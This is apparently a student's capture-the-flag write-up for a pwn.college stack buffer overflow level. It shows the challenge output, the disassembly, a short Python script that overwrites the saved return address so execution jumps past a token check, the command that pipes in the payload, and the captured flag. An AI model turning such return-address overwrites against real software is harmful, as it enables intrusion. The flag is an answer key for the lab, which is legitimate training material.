# Tricky Control Hijack

## Challenge
Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from getting the flag!

## Solve
**Flag:** `pwn.college{Q3GBdwFEi4R0CRTCd33Od7cFwSG.dlTOywyNyAzNzEzW}`

#### Gathering Info
In the `/challenge` directory, we are given **3 files:**
- DESCRPIPTION.md
- binary-exploitation-control-hijack-2-w
- binary-exploitation-control-hijack-2-w.c

`cat`ting `.c` file, I see that lots of information about the challenge was printed in **formatted strings** so I try to run the challenge once.

The output was as follows:
```
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc68765d00 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d08 (rsp+0x0008) | c8 6e 76 68 fc 7f 00 00 | 0x00007ffc68766ec8 |
| 0x00007ffc68765d10 (rsp+0x0010) | b8 6e 76 68 fc 7f 00 00 | 0x00007ffc68766eb8 |
| 0x00007ffc68765d18 (rsp+0x0018) | a0 86 10 31 01 00 00 00 | 0x00000001311086a0 |
| 0x00007ffc68765d20 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d28 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d30 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d38 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d40 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d48 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d50 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d58 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d60 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d68 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d70 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d78 (rsp+0x0078) | 00 00 00 00 fc 7f 00 00 | 0x00007ffc00000000 |
| 0x00007ffc68765d80 (rsp+0x0080) | 90 11 40 00 00 00 00 00 | 0x0000000000401190 |
| 0x00007ffc68765d88 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc68765d90 (rsp+0x0090) | c0 6d 76 68 fc 7f 00 00 | 0x00007ffc68766dc0 |
| 0x00007ffc68765d98 (rsp+0x0098) | ba 28 40 00 00 00 00 00 | 0x00000000004028ba |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffc68765d00, and our base pointer points to 0x7ffc68765d90.
This means that we have (decimal) 20 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 160 bytes.
The input buffer begins at 0x7ffc68765d20, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 92 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffc68765d98, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (92 to fill the buffer,
28 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffc68765d20 (the start of the input buffer)
right up to (but not including) 0x7ffc68766d20 (which is 4004 bytes beyond the end of the buffer).
Of these, you will overwrite 3976 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }

So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check,
and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow
that will overwrite the saved return address (at 0x7ffc68765d98, 120 bytes into the buffer)
with the correct value.
```

#### Key Takeaways:
**The Big Idea:**
- A function's stack frame is a little box of memory created when the function runs. 
- The program reads input into a fixed-size input buffer inside that box.
- If we give more bytes than the buffer can hold, those extra bytes continue writing into the rest of the box (for vulnerable files).

**Things Given to Us:**
- The stack pointer points to `0x7ffc68765d00` and the base pointer points to `0x7ffc68765d90`.
- We have a total of (decimal) **160 bytes** in our stack frame including `rsp` and `rbp`.
- The input buffer begins at `0x7ffc68765d20`, partway through the stack frame.
- Although the input buffer is (decimal) **92 bytes** long, we are allowed to overfow it.
- Address of **main** method is `0x7ffc68765d98` which is 120 bytes after the input buffer.
- The method responsible for giving us the flag is `win_authed()`. It only does so if the value of the variable `token` is set to `0x1337`.

#### The Aim
- Create a **128 byte** payload.
    - 92 bytes for input buffer.
    - 28 bytes for local variables.
    - 8 bytes to over-write the main return address.
- There are two methods to do this:
    - Hard
    - Easy
- **Hard**
    - Over-write the `main` address to `win_authed()` AND set the `token` value to `0x1337`.
- **Easy ( - the method I implemented ).**
    - Over-write the `main` address to an offset of `win_authed()` after it checks the token value and runs the next instruction.
    - Using `objdump` I found that address to be `0x40214f`.
    ```asm
    402142: cmpl $0x1337,-0x4(%rbp)   ; compare token to 0x1337
    402149: jne 40224d                ; jump to end if not equal
    40214f: lea 0xf9a(%rip),%rdi      ; first instruction after the check
    402156: call puts@plt
    ```
    - The very next instruction prints out the flag.
- ***Therefore, the first 120 bytes of the input are filler bytes and the last 8 bytes are the return address to instruction which prints the flag.***

#### Payload Used
```python
import struct

OFFSET = 120                      # bytes until the saved return address (from the challenge text)
TARGET_ADDR = 0x40214f            # address right after the token check in win_authed (little-endian)

payload = b"A" * OFFSET
payload += struct.pack("<Q", TARGET_ADDR)   # 8 bytes, little-endian

# Ensure no newline appended and exact length
with open("payload.bin", "wb") as f:
    f.write(payload)
```

#### Commands Used
```
python script.py
cat payload.bin | /challenge/./binary-expolitation-hijack-2-w
```


## New Learnings
- Using `gdb` to debug the code.
- Using `objdump` with `-d` flag to disassemble code and figuring out the function addresses in the memory.
